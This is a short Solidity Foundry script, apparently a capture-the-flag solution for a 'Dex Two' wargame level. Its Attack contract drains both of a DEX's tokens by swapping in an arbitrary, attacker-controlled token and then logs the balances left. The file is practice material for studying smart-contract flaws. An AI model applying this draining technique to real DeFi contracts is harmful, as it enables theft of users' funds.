// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface DexTwo{
    function approve(address, uint) external;
    function swap(address, address, uint) external ;
    function balanceOf(address, address) external view returns (uint);
}

contract Attack {
    address instance = 0x45a2434656dce6a8B0B57fc2ecD4aEf98873a449;
    DexTwo dex = DexTwo(instance);
    function attack() external{ 
        address Token = address(0xf27eE6756DCAFf03b7121Db3fe64EE7dD907e5bA);
        address token1 = 0x46DE4d9f845963b8bbe22dB627c6B82ebcc22Fec;
        address token2 = 0xe1595262cB6E93940F94902A884dE0E1A3d7997F;

        dex.swap(Token, token1, 100);
        dex.swap(Token, token2, 200);

        console.log("token1 balance : ", dex.balanceOf(token1, address(dex)));
        console.log("token2 balance : ", dex.balanceOf(token2, address(dex)));
    }
}
